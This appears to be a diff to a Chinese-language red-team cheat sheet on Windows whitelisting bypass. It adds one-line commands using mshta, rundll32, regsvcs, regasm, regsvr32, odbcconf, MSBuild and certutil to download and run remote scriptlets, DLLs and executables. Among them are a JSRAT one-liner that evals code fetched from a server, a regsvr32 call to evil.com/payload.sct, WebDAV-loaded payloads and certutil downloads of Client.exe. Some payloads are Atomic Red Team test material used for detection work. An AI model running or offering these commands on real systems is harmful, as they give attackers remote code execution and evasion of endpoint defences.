@@ -33,13 +33,65 @@ https://evi1cg.me/archives/Run_JSRAT.html
 
 #### 5. Mshta ####
 
+HTA（HTML Application)，可以嵌入`JScript`和`VBScript`，后缀名为`.hta`时可以直接运行，使用命令行`mshta`时，后缀可以使用`htm`,`xml`. 执行时带上绝对路径方可运行，否则无效。
+
 	mshta vbscript:Close(Execute("GetObject(""script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct"").Exec()"))
 
 	mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct").Exec();close();
 
 #### 6. Rundll32 ####
 
+利用时需要注意`RunHTMLApplication`后面是有一个空格。
+
 	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}%  #JSRAT
 
-	rundll32 AllTheThings.dll,EntryPoint	# https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings
+	rundll32 AllTheThings.dll,EntryPoint 
 
+	rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/mshta.sct");o.Exec();window.close();	
+
+https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings
+
+#### 7. Regsvcs/Regasm
+
+白名单绕过方法，通过加载DLL(.Net/C#).	(尝试在即编写dll，一直失败）, `regsvcs`注册`dll`需要签名。
+
+	x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
+
+	x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
+
+
+	x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
+
+	x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll
+
+https://github.com/redcanaryco/atomic-red-team/tree/master/Windows/Payloads/AllTheThings
+
+https://gist.githubusercontent.com/jbarcia/a5ba8cf3badebf3c802f83832eda1059/raw/39aa6341cda40500a02cfc069b6d6ec45f1c5028/evil.cs(在编译这个脚本时，需要更改系统语言区域为英语/美国，非unicode，编译就不会报错了)
+
+	rundll32 evil.dll,EntryPoint
+
+http://www.codesec.net/view/443056.html
+
+#### 8. Regsvr32
+
+本地脚本加载运行
+
+	regsvr32.exe /s /u /i:payload.sct scrobj.dll
+
+远程脚本加载运行
+
+	regsvr32.exe /s /u /i:http://evil.com/payload.sct scrobj.dll
+
+	regsvr32.exe  payload.dll	# DLLregisterServer
+	regsvr32.exe  /u payload.dll # DLLUnregisterServer
+
+#### 9. odbcconf/Msbuild
+
+	odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
+
+	cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
+
+windows 文件下载
+
+	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe 1.exe
+	certutil.exe -urlcache -split -f http://192.168.1.192/Client.exe delete
